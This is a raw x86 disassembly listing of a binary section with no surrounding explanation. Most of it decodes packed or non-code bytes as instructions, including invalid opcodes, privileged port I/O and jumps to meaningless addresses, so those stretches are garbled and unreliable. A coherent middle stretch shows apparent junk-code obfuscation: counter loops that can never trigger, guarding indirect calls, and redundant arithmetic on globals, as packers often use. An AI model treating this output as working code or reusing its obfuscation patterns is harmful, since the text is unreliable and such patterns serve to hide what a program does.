  41353b:	add    DWORD PTR [edx-0x1eff9789],edi
  413541:	data16 int3 
  413543:	idiv   BYTE PTR [ecx+ecx*8-0x27c0cbc]
  41354a:	jbe    0x413546
  41354c:	and    BYTE PTR [edx-0x38f9d47b],dl
  413552:	and    eax,0xcc1863c6
  413557:	icebp  
  413558:	cmpxchg DWORD PTR [esi],eax
  41355b:	push   ebx
  41355c:	xor    cl,al
  41355e:	outs   dx,BYTE PTR ds:[esi]
  41355f:	rcl    DWORD PTR [eax-0x56],0x10
  413563:	ja     0x413582
  413565:	pop    ebx
  413566:	add    edx,DWORD PTR [ecx-0x2aacff22]
  41356c:	ja     0x41356c
  41356e:	dec    esi
  41356f:	inc    edi
  413570:	fistp  QWORD PTR [eax+0x7fb8b443]
  413576:	jmp    0x413506
  413578:	dec    edi
  413579:	jecxz  0x4135a7
  41357b:	fisttp DWORD PTR [edi-0x1a]
  41357e:	pop    edx
  41357f:	ret    
  413580:	imul   ebp,DWORD PTR [eax+edx*2-0x28e7415c],0x7d25a14c
  41358b:	call   0xfb61:0x91aee7dd
  413592:	mov    ebp,0x9fa06393
  413597:	shl    ecx,1
  413599:	cld    
  41359a:	sbb    BYTE PTR ds:0xf6bc55e6,ch
  4135a0:	inc    eax
  4135a1:	dec    esi
  4135a2:	ds jmp 0x413537
  4135a5:	inc    edi
  4135a6:	cld    
  4135a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135a8:	mov    ebp,0xe969f755
  4135ad:	or     cl,BYTE PTR [ebx+0x22]
  4135b0:	mov    cl,0xd0
  4135b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135b3:	pop    esi
  4135b4:	push   edx
  4135b5:	in     eax,0x2f
  4135b7:	cwde   
  4135b8:	dec    edi
  4135b9:	sbb    BYTE PTR [edi+0x11],dh
  4135bc:	mov    cl,0x7e
  4135be:	icebp  
  4135bf:	cmp    eax,0x7a5cf1ad
  4135c4:	hlt    
  4135c5:	and    DWORD PTR [edx-0x39],esp
  4135c8:	test   BYTE PTR ds:0x2ee0073e,dl
  4135ce:	lods   eax,DWORD PTR ds:[esi]
  4135cf:	jl     0x41358a
  4135d1:	and    DWORD PTR [eax+0x60],ecx
  4135d4:	enter  0x30ea,0x5d
  4135d8:	les    esp,FWORD PTR [edx+0x44]
  4135db:	sar    dl,0x83
  4135de:	sub    al,0xdd
  4135e0:	int    0x30
  4135e2:	jb     0x413649
  4135e4:	(bad)  [ebx+0x2742c4bd]
  4135ea:	jae    0x4135d7
  4135ec:	pop    sp
  4135ee:	inc    eax
  4135ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135f0:	add    edx,DWORD PTR [esi+edx*8-0x7a4b4948]
  4135f7:	add    edi,DWORD PTR [edi-0x4f437947]
  4135fd:	cwde   
  4135fe:	les    edx,FWORD PTR [eax+0xd]
  413601:	das    
  413602:	adc    eax,0x25de0049
  413607:	dec    esp
  413608:	cld    
  413609:	xchg   esi,eax
  41360a:	mov    ebx,0xb8bb0e69
  41360f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413610:	clc    
  413611:	test   al,0xba
  413613:	sti    
  413614:	cmp    DWORD PTR [esi+edx*2-0x43],esp
  413618:	das    
  413619:	add    al,BYTE PTR [edx-0xf]
  41361c:	jno    0x4135ff
  41361e:	push   ecx
  41361f:	xchg   edi,eax
  413620:	xor    al,0x99
  413622:	mov    BYTE PTR [ecx-0x2b39e7de],bl
  413628:	cmp    DWORD PTR [ebx+ebp*2],ecx
  41362b:	imul   ecx,edx,0x6270aa77
  413631:	cmp    BYTE PTR [bp+di+0x2f],al
  413635:	gs in  eax,dx
  413637:	imul   esi,DWORD PTR [edi-0x3a],0xffffff89
  41363b:	cmp    DWORD PTR [edi-0x58039a82],ecx
  413641:	adc    bl,BYTE PTR [eax-0x693cc24]
  413647:	fdiv   DWORD PTR [esi]
  413649:	jl     0x41368c
  41364b:	popf   
  41364c:	inc    edx
  41364d:	stc    
  41364e:	pop    eax
  41364f:	cs pop esi
  413651:	out    dx,eax
  413652:	popa   
  413653:	out    0xb,al
  413655:	in     eax,0xc3
  413657:	ja     0x4135dd
  413659:	add    BYTE PTR [ebp-0x4d],cl
  41365c:	cdq    
  41365d:	lods   al,BYTE PTR ds:[esi]
  41365e:	inc    edi
  41365f:	xchg   DWORD PTR [edx+0x6c03688],eax
  413665:	(bad)  
  413666:	test   al,0x8d
  413668:	push   ds
  413669:	or     edx,ebp
  41366b:	jne    0x4136c8
  41366d:	popa   
  41366e:	mov    eax,0x68569d25
  413673:	jmp    0x4ca40e77
  413678:	adc    cl,BYTE PTR [ebx]
  41367a:	(bad)  
  41367b:	stc    
  41367c:	retf   
  41367d:	les    eax,FWORD PTR [ecx]
  41367f:	outs   dx,BYTE PTR ds:[esi]
  413680:	out    dx,eax
  413681:	mov    ds:0xd98e2ade,eax
  413686:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413687:	mov    ah,0xee
  413689:	mov    eax,ds:0xdec05c17
  41368e:	mov    dh,cl
  413690:	or     bl,BYTE PTR [ebp-0x66e60a99]
  413696:	jle    0x413651
  413698:	loope  0x4136b2
  41369a:	popf   
  41369b:	mov    esi,0xee32d029
  4136a0:	inc    ebp
  4136a1:	test   ecx,ecx
  4136a3:	push   ecx
  4136a4:	push   edi
  4136a5:	mov    ecx,0x9049b976
  4136aa:	push   edi
  4136ab:	(bad)  
  4136ad:	arpl   WORD PTR [esi-0x6992c851],cx
  4136b3:	std    
  4136b4:	adc    BYTE PTR [ecx],ah
  4136b6:	add    ecx,DWORD PTR [ebp+0x7a]
  4136b9:	sbb    DWORD PTR [eax-0x5d5d32c1],0xfa87dff4
  4136c3:	jge    0x41364f
  4136c5:	sub    BYTE PTR [ecx],ah
  4136c7:	ins    BYTE PTR es:[edi],dx
  4136c8:	inc    esi
  4136c9:	jmp    0x45638da6
  4136ce:	mov    al,0x7b
  4136d0:	jmp    0xe28:0xc68ca9f2
  4136d7:	fist   DWORD PTR [ebx]
  4136d9:	lds    ebp,FWORD PTR [ebp+edi*8+0x71dbfc5d]
  4136e0:	inc    esp
  4136e1:	scas   al,BYTE PTR es:[edi]
  4136e2:	clc    
  4136e3:	push   edi
  4136e4:	mov    ch,0x80
  4136e6:	repnz push esi
  4136e8:	or     DWORD PTR [esi-0x29dc5cad],eax
  4136ee:	push   ebx
  4136ef:	push   ss
  4136f0:	(bad)  
  4136f1:	jns    0x413678
  4136f3:	add    BYTE PTR [ecx-0x6ee2107b],ah
  4136f9:	rol    DWORD PTR ds:0x2899d6b6,cl
  4136ff:	pop    ds
  413700:	push   es
  413701:	je     0x4136de
  413703:	xchg   esp,eax
  413704:	fcmovnu st,st(4)
  413706:	jae    0x4136a7
  413708:	aam    0x5f
  41370a:	jae    0x4136cf
  41370c:	dec    esp
  41370d:	sub    al,BYTE PTR [esp+edi*2-0x52339a]
  413714:	test   DWORD PTR [esi],ebp
  413716:	hlt    
  413717:	push   ebp
  413718:	and    DWORD PTR [ebx-0x67],ebx
  41371b:	shl    cl,1
  41371d:	and    DWORD PTR [esi],edi
  41371f:	push   DWORD PTR [ebx-0x62]
  413722:	and    dl,BYTE PTR [ecx-0x2d]
  413725:	cs pop esp
  413727:	add    BYTE PTR [edx],bh
  413729:	xor    eax,DWORD PTR [ebx+ebp*1-0x1cdcb227]
  413730:	mov    esp,0xa96df0a1
  413735:	aas    
  413736:	lods   al,BYTE PTR ds:[esi]
  413737:	push   edi
  413738:	xchg   BYTE PTR [ebp+ebp*4+0x69c545a],dl
  41373f:	xchg   DWORD PTR [ecx],edi
  413741:	fsubr  DWORD PTR [eax+eiz*1+0x5b7948db]
  413748:	push   esi
  413749:	je     0x4137c8
  41374b:	jmp    0x6a449d4c
  413750:	frstor [eax-0x415f8d17]
  413756:	nop
  413757:	and    al,0xb1
  413759:	xor    ebx,esp
  41375b:	dec    ebp
  41375c:	fcom   QWORD PTR ds:0xc0befd8e
  413762:	xchg   esi,eax
  413763:	rcl    BYTE PTR [edx-0x10],cl
  413766:	fisubr WORD PTR [ebx]
  413768:	mov    edi,0xca6ef16e
  41376d:	cs repnz push edx
  413770:	push   0x5e
  413772:	stc    
  413773:	fmul   st,st(0)
  413775:	adc    al,0xf8
  413777:	and    BYTE PTR [eax+ecx*2+0x21],dh
  41377b:	mov    edi,0x67e8ff11
  413780:	xchg   ebx,eax
  413781:	call   0x79808981
  413786:	mov    edx,0x92a826fc
  41378b:	repz mov al,ds:0xe660787d
  413791:	jg     0x413718
  413793:	ffreep st(3)
  413795:	callw  0x9c24
  413799:	sbb    ebp,DWORD PTR [ebp+0x72]
  41379c:	mov    eax,0x1993aa4e
  4137a1:	push   ebx
  4137a2:	pop    ebx
  4137a3:	pop    edx
  4137a4:	or     ah,BYTE PTR [esi+0x56]
  4137a7:	arpl   WORD PTR [edi],cx
  4137a9:	(bad)  
  4137aa:	repnz mov ebx,0x59ed88ef
  4137b0:	mov    eax,0xc9e1af5e
  4137b5:	cmp    ah,BYTE PTR [esi+esi*4]
  4137b8:	pop    ss
  4137b9:	inc    ebx
  4137ba:	mov    ebp,0xcdccf676
  4137bf:	fiadd  WORD PTR ds:0x88cbc89d
  4137c5:	dec    ecx
  4137c6:	adc    ebx,ecx
  4137c8:	xchg   dh,ch
  4137ca:	shl    DWORD PTR [esp+edi*2-0x6eb462d9],1
  4137d1:	es dec edx
  4137d3:	add    al,cl
  4137d5:	xchg   ecx,eax
  4137d6:	sti    
  4137d7:	fisttp QWORD PTR [esi-0x6ee1caf9]
  4137dd:	add    al,0x19
  4137df:	sub    ah,BYTE PTR [eax]
  4137e1:	inc    eax
  4137e2:	js     0x413856
  4137e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137e5:	push   ebp
  4137e6:	push   edi
  4137e7:	hlt    
  4137e8:	leave  
  4137e9:	retf   
  4137ea:	addr16 loop 0x4137e4
  4137ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137ee:	push   esi
  4137ef:	sbb    bh,ah
  4137f1:	fcmovnbe st,st(5)
  4137f3:	out    0x46,al
  4137f5:	xchg   esi,eax
  4137f6:	mov    bl,0xf6
  4137f8:	mov    eax,ds:0xeaffbcff
  4137fd:	cdq    
  4137fe:	lds    esi,FWORD PTR [eax]
  413800:	ja     0x41382a
  413802:	jo     0x4137e7
  413804:	loopne 0x413846
  413806:	das    
  413807:	mov    ecx,0xa9d4a58d
  41380c:	leave  
  41380d:	mov    esp,0xc31025e3
  413812:	daa    
  413813:	loope  0x4137a1
  413815:	inc    ebp
  413816:	mov    ah,0xb0
  413818:	jo     0x4137b9
  41381a:	loop   0x41379f
  41381c:	rol    BYTE PTR [ebp-0x29837989],1
  413822:	in     al,0xa2
  413824:	mov    es,WORD PTR [edi-0x19126125]
  41382a:	dec    edi
  41382b:	mov    edi,0xe7a7bea3
  413830:	(bad)  
  413831:	in     al,dx
  413832:	mov    ss,WORD PTR [edi]
  413834:	fnsave [eax+eax*8]
  413837:	sbb    esp,DWORD PTR [edx]
  413839:	js     0x4137f1
  41383b:	ja     0x41386f
  41383d:	xor    al,0x78
  41383f:	repnz xlat BYTE PTR ds:[ebx]
  413841:	out    0xbe,al
  413843:	mov    eax,0x3726747e
  413848:	mov    ds:0x5724e96e,eax
  41384d:	aaa    
  41384e:	sbb    DWORD PTR [edi+0x2a64d9bc],esi
  413854:	fs pop edx
  413856:	pop    esp
  413857:	sub    eax,0x40902088
  41385c:	adc    eax,0xaa4d9663
  413861:	cmp    eax,0x74aca228
  413866:	mov    WORD PTR [edx+0x34],cs
  413869:	fs xchg esi,eax
  41386b:	and    bl,BYTE PTR [ecx+0x6676fb9e]
  413871:	jns    0x4138e8
  413873:	loop   0x4138c8
  413875:	adc    BYTE PTR [ebx],bh
  413877:	xchg   esi,eax
  413878:	dec    ecx
  413879:	mov    cl,al
  41387b:	scas   eax,DWORD PTR es:[edi]
  41387c:	stc    
  41387d:	xchg   edx,eax
  41387e:	adc    ebx,esi
  413880:	mov    bl,0xd7
  413882:	pop    ecx
  413883:	cmp    eax,DWORD PTR [edi-0x1d7228c7]
  413889:	leave  
  41388a:	and    eax,0xe35cc6d1
  41388f:	add    bh,BYTE PTR [edx+0xb60b47c]
  413895:	or     DWORD PTR [esi+edx*1-0x2039ce3],esi
  41389c:	mov    eax,ds:0xfd1abfa9
  4138a1:	arpl   WORD PTR [ebx-0x6d0eca85],si
  4138a7:	jg     0x413909
  4138a9:	fs push ebx
  4138ab:	add    eax,0xdc6db11e
  4138b0:	fsub   QWORD PTR ds:0x4c10e1f7
  4138b6:	add    al,0xf8
  4138b8:	je     0x4138e9
  4138ba:	mov    al,0x11
  4138bc:	adc    DWORD PTR [eax],0x54b08962
  4138c2:	cwde   
  4138c3:	test   esp,eax
  4138c5:	mov    bh,0xb5
  4138c7:	mov    bl,0x43
  4138c9:	ret    
  4138ca:	xchg   BYTE PTR [ecx-0x55cdd28f],cl
  4138d0:	shl    BYTE PTR [ebx-0x3],1
  4138d3:	jmp    0x57785a39
  4138d8:	pop    ss
  4138d9:	(bad)  
  4138da:	clc    
  4138db:	jmp    0xdc47:0x5a49b18
  4138e2:	push   eax
  4138e3:	xor    ebx,eax
  4138e5:	and    DWORD PTR ds:0x42b01c,0x4e66
  4138ef:	sub    edx,ebx
  4138f1:	sub    edx,esi
  4138f3:	adc    DWORD PTR ds:0x42c014,0x3307
  4138fd:	xor    edx,eax
  4138ff:	add    DWORD PTR ds:0x42d004,0x3241
  413909:	mov    DWORD PTR [ebp+0x8],edx
  41390c:	or     ebx,ebx
  41390e:	mov    edx,DWORD PTR [ebp+0x8]
  413911:	mov    ebx,DWORD PTR [ebp-0x58]
  413914:	sub    DWORD PTR ds:0x429004,0x42c00c
  41391e:	add    edx,0x5708c4
  413924:	imul   edx,ebx
  413927:	mov    DWORD PTR [ebp-0x58],edx
  41392a:	mov    edx,DWORD PTR [ebp+0x8]
  41392d:	and    DWORD PTR ds:0x42d01c,0x0
  413937:	mov    ebx,DWORD PTR ds:0x42d01c
  41393d:	inc    ebx
  41393e:	mov    DWORD PTR ds:0x42d01c,ebx
  413944:	cmp    DWORD PTR ds:0x42d01c,0x29
  41394b:	jne    0x41395a
  413951:	push   DWORD PTR [ebp-0x24]
  413954:	call   DWORD PTR ds:0x42e913
  41395a:	cmp    DWORD PTR ds:0x42d01c,0x1e
  413961:	jb     0x413937
  413967:	and    DWORD PTR ds:0x42d004,0x0
  413971:	mov    ebx,DWORD PTR ds:0x42d004
  413977:	inc    ebx
  413978:	mov    DWORD PTR ds:0x42d004,ebx
  41397e:	cmp    DWORD PTR ds:0x42d004,0x7
  413985:	jne    0x4139a0
  41398b:	push   0x1baa
  413990:	push   0x42e075
  413995:	push   0x429010
  41399a:	call   DWORD PTR ds:0x42e917
  4139a0:	cmp    DWORD PTR ds:0x42d004,0x6
  4139a7:	jne    0x4139ba
  4139ad:	mov    ebx,DWORD PTR ds:0x42d004
  4139b3:	inc    ebx
  4139b4:	mov    DWORD PTR ds:0x42d004,ebx
  4139ba:	cmp    DWORD PTR ds:0x42d004,0x14
  4139c1:	jb     0x413971
  4139c7:	add    DWORD PTR ds:0x42d000,edx
  4139cd:	mov    ebx,DWORD PTR [ebp-0x54]
  4139d0:	mov    DWORD PTR ds:0x42b008,0x4ad3
  4139da:	add    edx,0x64f8da
  4139e0:	or     edx,ebx
  4139e2:	add    DWORD PTR ds:0x42c008,0x5d21
  4139ec:	mov    DWORD PTR [ebp-0x54],edx
  4139ef:	mov    edx,DWORD PTR [ebp+0x8]
  4139f2:	mov    ebx,DWORD PTR [ebp-0x50]
  4139f5:	and    DWORD PTR ds:0x42b008,0x3404
  4139ff:	add    edx,ecx
  413a01:	xor    DWORD PTR ds:0x42a000,0x42d000
  413a0b:	xor    edx,ebx
  413a0d:	mov    DWORD PTR [ebp-0x50],edx
  413a10:	add    ebx,edx
  413a12:	mov    edx,DWORD PTR [ebp+0x8]
  413a15:	adc    DWORD PTR ds:0x429008,edx
  413a1b:	mov    ebx,DWORD PTR [ebp-0x4c]
  413a1e:	or     DWORD PTR ds:0x429028,0x42d010
  413a28:	add    edx,edi
  413a2a:	or     DWORD PTR ds:0x429008,0x429010
  413a34:	and    edx,ebx
  413a36:	xor    DWORD PTR ds:0x429028,ecx
  413a3c:	mov    DWORD PTR [ebp-0x4c],edx
  413a3f:	mov    DWORD PTR ds:0x42c004,0x18
  413a49:	cmp    DWORD PTR ds:0x42c004,0x0
  413a50:	je     0x413a93
  413a56:	cmp    DWORD PTR ds:0x42c004,0x1e
  413a5d:	jne    0x413a7b
  413a63:	push   0x42a004
  413a68:	push   0x2285
  413a6d:	push   DWORD PTR [ebp-0x24]
  413a70:	push   0x1fc0
  413a75:	call   DWORD PTR ds:0x42e8cf
  413a7b:	mov    ebx,DWORD PTR ds:0x42c004
  413a81:	dec    ebx
  413a82:	mov    DWORD PTR ds:0x42c004,ebx
  413a88:	jmp    0x413a49
  413a8d:	add    DWORD PTR ds:0x42d00c,ecx
  413a93:	mov    edx,DWORD PTR [ebp+0x8]
  413a96:	sbb    ebx,DWORD PTR ds:0x42a00c
  413a9c:	mov    ebx,DWORD PTR [ebp-0x48]
  413a9f:	lea    edx,[ebx+edx*1+0x241fc1f]
  413aa6:	mov    DWORD PTR [ebp-0x48],edx
  413aa9:	inc    edx
  413aaa:	mov    edx,DWORD PTR [ebp+0x8]
  413aad:	movzx  ebx,BYTE PTR ds:0x429000
  413ab4:	sbb    DWORD PTR ds:0x42c018,ebx
  413aba:	mov    ebx,0xfa5e15e2
  413abf:	sub    ebx,edx
  413ac1:	add    ebx,DWORD PTR [ebp-0x44]
  413ac4:	and    DWORD PTR ds:0x42c018,0x0
  413ace:	jmp    0x413ae0
  413ad3:	mov    edx,DWORD PTR ds:0x42c018
  413ad9:	inc    edx
  413ada:	mov    DWORD PTR ds:0x42c018,edx
  413ae0:	cmp    DWORD PTR ds:0x42c018,0x15
  413ae7:	jae    0x413b1a
  413aed:	cmp    DWORD PTR ds:0x42c018,0x18
  413af4:	jne    0x413b0f
  413afa:	push   0x88b0
  413aff:	push   0x8c9b
  413b04:	push   0x27a5
  413b09:	call   DWORD PTR ds:0x42e8d3
  413b0f:	jmp    0x413ad3
  413b14:	or     DWORD PTR ds:0x42b004,edx
  413b1a:	mov    DWORD PTR [ebp-0x44],ebx
  413b1d:	mov    DWORD PTR ds:0x42d00c,0x11
  413b27:	cmp    DWORD PTR ds:0x42d00c,0x0
  413b2e:	je     0x413b75
  413b34:	cmp    DWORD PTR ds:0x42d00c,0x1d
  413b3b:	jne    0x413b59
  413b41:	push   0x88e0
  413b46:	push   DWORD PTR [ebp-0x18]
  413b49:	push   0x3079
  413b4e:	push   0x26f3
  413b53:	call   DWORD PTR ds:0x42e8d7
  413b59:	mov    edx,DWORD PTR ds:0x42d00c
  413b5f:	dec    edx
  413b60:	mov    DWORD PTR ds:0x42d00c,edx
  413b66:	jmp    0x413b27
  413b6b:	add    DWORD PTR ds:0x42a014,0x1458
  413b75:	mov    edx,DWORD PTR [ebp+0x8]
  413b78:	xor    DWORD PTR ds:0x429008,0x1867
  413b82:	xor    edx,eax
  413b84:	mov    DWORD PTR ds:0x42900c,0x6609
  413b8e:	add    edx,esi
  413b90:	mov    DWORD PTR ds:0x42d008,0x7de
  413b9a:	jne    0x41157e
  413ba0:	mov    DWORD PTR ds:0x42a008,0x2294
  413baa:	jmp    0x41cc2e
  413baf:	xor    edx,edx
  413bb1:	add    edx,DWORD PTR ds:0x42d014
  413bb7:	sbb    DWORD PTR ds:0x429008,edx
  413bbd:	mov    edx,DWORD PTR [ebp-0xc]
  413bc0:	mov    DWORD PTR ds:0x429010,0x17
  413bca:	cmp    DWORD PTR ds:0x429010,0x0
  413bd1:	je     0x413c04
  413bd7:	cmp    DWORD PTR ds:0x429010,0x18
  413bde:	jne    0x413bea
  413be4:	call   DWORD PTR ds:0x42e91b
  413bea:	xor    ebx,ebx
  413bec:	add    ebx,DWORD PTR ds:0x429010
  413bf2:	dec    ebx
  413bf3:	mov    DWORD PTR ds:0x429010,ebx
  413bf9:	jmp    0x413bca
  413bfe:	or     DWORD PTR ds:0x42c014,ebx
  413c04:	sub    edx,esi
  413c06:	xor    edx,eax
  413c08:	mov    ebx,DWORD PTR ds:0x41cdd0
  413c0e:	mov    ebx,DWORD PTR [ebx]
  413c10:	sub    DWORD PTR ds:0x42b018,ebx
  413c16:	mov    DWORD PTR [ebp-0x5c],edx
  413c19:	and    DWORD PTR ds:0x42b004,0x0
  413c23:	jmp    0x413c35
  413c28:	mov    ebx,DWORD PTR ds:0x42b004
  413c2e:	inc    ebx
  413c2f:	mov    DWORD PTR ds:0x42b004,ebx
  413c35:	cmp    DWORD PTR ds:0x42b004,0x1c
  413c3c:	jae    0x413c60
  413c42:	cmp    DWORD PTR ds:0x42b004,0x24
  413c49:	jne    0x413c5b
  413c4f:	push   DWORD PTR [ebp-0x1c]
  413c52:	push   DWORD PTR [ebp-0x10]
  413c55:	call   DWORD PTR ds:0x42e91f
  413c5b:	jmp    0x413c28
  413c60:	mov    edx,DWORD PTR [ebp-0x10]
  413c63:	mov    ebx,DWORD PTR [ebp-0x8]
  413c66:	xor    edx,eax
  413c68:	xor    ebx,eax
  413c6a:	sub    edx,ebx
  413c6c:	sub    edx,esi
  413c6e:	xor    edx,eax
  413c70:	mov    DWORD PTR [ebp-0x10],edx
  413c73:	mov    edx,DWORD PTR [ebp-0x14]
  413c76:	mov    DWORD PTR [ebp+0x8],edx
  413c79:	jmp    0x416037
  413c7e:	mov    edx,DWORD PTR [ebp+0x8]
  413c81:	mov    ebx,DWORD PTR [ebp-0x8]
  413c84:	xor    edx,eax
  413c86:	xor    ebx,eax
  413c88:	sub    edx,ebx
  413c8a:	sub    edx,esi
  413c8c:	xor    edx,eax
  413c8e:	mov    DWORD PTR [ebp+0x8],edx
  413c91:	mov    edx,DWORD PTR [ebp+0x8]
  413c94:	mov    ebx,DWORD PTR [ebp-0x58]
  413c97:	add    edx,0x5708c4
  413c9d:	imul   edx,ebx
  413ca0:	mov    DWORD PTR [ebp-0x58],edx
  413ca3:	mov    edx,DWORD PTR [ebp+0x8]
  413ca6:	mov    ebx,DWORD PTR [ebp-0x54]
  413ca9:	add    edx,0x64f8da
  413caf:	or     edx,ebx
  413cb1:	mov    DWORD PTR [ebp-0x54],edx
  413cb4:	mov    edx,DWORD PTR [ebp+0x8]
  413cb7:	mov    ebx,DWORD PTR [ebp-0x50]
  413cba:	add    edx,ecx
  413cbc:	jmp    0x416005
  413cc1:	xchg   ecx,eax
  413cc2:	mov    bh,BYTE PTR [edx]
  413cc4:	aad    0x3
  413cc6:	mov    ch,0x93
  413cc8:	mov    ah,al
  413cca:	xor    ebx,ecx
  413ccc:	ja     0x413d26
  413cce:	pop    edx
  413ccf:	cmp    eax,0x7c8a1475
  413cd4:	jl     0x413d16
  413cd6:	pop    edi
  413cd7:	jl     0x413d55
  413cd9:	and    eax,0x3401f94d
  413cde:	aad    0x18
  413ce0:	adc    DWORD PTR [ebx+0x15],edi
  413ce3:	iret   
  413ce4:	fisubr WORD PTR ds:0xb07d9d74
  413cea:	ins    DWORD PTR es:[edi],dx
  413ceb:	ret    0x399d
  413cee:	jg     0x413d42
  413cf0:	(bad)  
  413cf1:	into   
  413cf2:	fst    DWORD PTR [esp+edi*8]
  413cf5:	inc    edx
  413cf6:	mov    ebp,0x3d56cd19
  413cfb:	xchg   edi,eax
  413cfc:	(bad)  
  413cfd:	push   edx
  413cfe:	test   DWORD PTR [ebx],esp
  413d00:	(bad)
  413d05:	fdivr  st(2),st
  413d07:	ret    
  413d08:	mov    dl,0xbf
  413d0a:	inc    ebx
  413d0b:	into   
  413d0c:	add    bh,BYTE PTR [edi+0x1ca80847]
  413d12:	aad    0xc3
  413d14:	pop    ss
  413d15:	mov    edi,0x3516fddb
  413d1a:	loopne 0x413d7e
  413d1c:	loope  0x413d38
  413d1e:	stos   DWORD PTR es:[edi],eax
  413d1f:	or     ch,ah
  413d21:	aaa    
  413d22:	test   DWORD PTR [ecx-0x57305263],edx
  413d28:	aaa    
  413d29:	pop    ds
  413d2a:	jnp    0x413d76
  413d2c:	and    DWORD PTR [ebx],ecx
  413d2e:	xchg   edi,eax
  413d2f:	pop    ebp
  413d30:	mov    ds:0x4e3a53f7,al
  413d35:	sub    BYTE PTR ss:0xa72bf1ef,bl
  413d3c:	and    cl,0x25
  413d3f:	fld    QWORD PTR [esi]
  413d41:	js     0x413ccd
  413d43:	mov    ecx,0xb5516f59
  413d48:	inc    esi
  413d49:	sbb    BYTE PTR [ecx+eax*4-0x7d522a2c],bh
  413d50:	pop    ebp
  413d51:	mov    eax,ds:0xb357923d
  413d56:	outs   dx,DWORD PTR ds:[esi]
  413d57:	pop    ss
  413d58:	test   eax,0x4ac6ecf9
  413d5d:	repz mov ah,BYTE PTR [ebx+ecx*2-0x4bd87d63]
  413d65:	sub    dl,al
  413d67:	jg     0x413d26
  413d69:	mov    ebp,0x7026fdc8
  413d6e:	mov    ch,0xd5
  413d70:	ror    DWORD PTR [ecx+0x2b],1
  413d73:	jmp    0x413d21
  413d75:	mov    bl,0x7f
  413d77:	ins    DWORD PTR es:[edi],dx
  413d78:	arpl   bx,sp
  413d7a:	push   esi
  413d7b:	loop   0x413d0c
  413d7d:	mov    ebx,0x9caa6a14
  413d82:	sub    eax,0x766db3f2
  413d87:	mov    edi,0xb2d11315
  413d8c:	cdq    
  413d8d:	ss repz mov edx,0x4181da70
  413d94:	lods   eax,DWORD PTR ds:[esi]
  413d95:	sub    DWORD PTR [ecx-0x6fa9789f],edi
  413d9b:	mov    edi,0xb78a666d
  413da0:	mov    al,0xa8
  413da2:	in     eax,0x7c
  413da4:	xchg   edi,eax
  413da5:	push   0xffffff81
  413da7:	sbb    dl,BYTE PTR [ebx-0x64]
  413daa:	add    eax,0x1cb4e770
  413daf:	(bad)  
  413db0:	(bad)  
  413db2:	mov    BYTE PTR [ecx-0xf1437c3],al
  413db8:	push   edi
  413db9:	ficomp WORD PTR [esi-0x650fde82]
  413dbf:	std    
  413dc0:	inc    edi
  413dc1:	adc    al,0xe4
  413dc3:	in     eax,dx
  413dc4:	adc    al,0xd3
  413dc6:	push   edi
  413dc7:	lods   al,BYTE PTR ds:[esi]
  413dc8:	lahf   
  413dc9:	xchg   BYTE PTR [ecx+0x4ba863a5],ch
  413dcf:	xchg   ch,ah
  413dd1:	jne    0x413e0f
  413dd3:	mov    esi,0x2ba7ad7d
  413dd8:	jmp    0x11bd:0x17e9338c
  413ddf:	leave  
  413de0:	cmp    eax,DWORD PTR [ebp-0x80]
  413de3:	dec    eax
  413de4:	push   esi
  413de5:	sub    eax,0x8a5cb5d3
  413dea:	lods   al,BYTE PTR ds:[esi]
  413deb:	call   0xfed7:0x5d848080
  413df2:	xchg   esp,eax
  413df3:	mov    dh,0x69
  413df5:	inc    edx
  413df6:	xchg   esp,eax
  413df7:	xlat   BYTE PTR ds:[ebx]
  413df8:	push   ds
  413df9:	int    0xea
  413dfb:	mov    bh,cl
  413dfd:	push   ss
  413dfe:	std    
  413dff:	xchg   DWORD PTR [ebp+0x7eefead6],eax
  413e05:	ror    BYTE PTR ds:0x8c533d56,0xb7
  413e0c:	push   0x45
  413e0e:	and    al,0xa2
  413e10:	je     0x413e86
  413e12:	xchg   ecx,eax
  413e13:	xchg   ch,bh
  413e15:	stc    
  413e16:	outs   dx,BYTE PTR cs:[esi]
  413e18:	nop
  413e19:	outs   dx,BYTE PTR ds:[esi]
  413e1a:	mov    eax,0xda893fc9
  413e1f:	pop    ds
  413e20:	scas   eax,DWORD PTR es:[edi]
  413e21:	mov    edi,0x2c6dd972
  413e26:	imul   eax,DWORD PTR [edi+0x26],0x2a
  413e2a:	push   esp
  413e2b:	enter  0xa051,0x54
  413e2f:	cli    
  413e30:	shr    DWORD PTR [edx-0x6d4d9168],1
  413e36:	add    ch,BYTE PTR [edx-0x2636c6a2]
  413e3c:	test   al,0x4d
  413e3e:	or     BYTE PTR [ebp-0x6219024d],al
  413e44:	addr16 jmp 0x413e95
  413e47:	(bad)
  413e4b:	dec    ecx
  413e4c:	aas    
  413e4d:	xor    edx,edx
  413e4f:	(bad)  
  413e50:	imul   ecx,DWORD PTR [esi],0xffffffd6
  413e53:	(bad)  
  413e54:	out    dx,eax
  413e55:	jbe    0x413e71
  413e57:	pop    ds
  413e58:	add    esp,eax
  413e5a:	test   al,0x21
  413e5c:	mov    eax,ds:0x8c7e8f46
  413e61:	mov    ecx,esi
  413e63:	and    ch,BYTE PTR [ebx-0x4c5d1209]
  413e69:	xchg   ebx,edx
  413e6b:	loope  0x413e6d
  413e6d:	dec    eax
  413e6e:	mov    eax,0xb869d726
  413e73:	aas    
  413e74:	fucomip st,st(2)
  413e76:	mov    ?,WORD PTR [ebx+0x5e45c0aa]
  413e7c:	div    BYTE PTR [edx+0x20]
  413e7f:	xor    DWORD PTR [ecx-0x5ad3bdd7],ebp
  413e85:	(bad)  
  413e87:	bound  edi,QWORD PTR ds:[eax-0x4e225779]
  413e8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e8f:	(bad)  
  413e90:	push   ds
  413e91:	dec    ebx
  413e92:	sub    al,0xf4
  413e94:	rol    BYTE PTR [ebx-0x4],cl
  413e97:	hlt    
  413e98:	dec    ebx
  413e99:	and    eax,0xf2dd6d19
  413e9e:	sbb    ch,dh
  413ea0:	sar    DWORD PTR [ebx+0xbd5a3c2],cl
  413ea6:	push   0x1cc5e5d
  413eab:	pop    esi
  413eac:	inc    ecx
  413ead:	(bad)  
  413eae:	cmc    
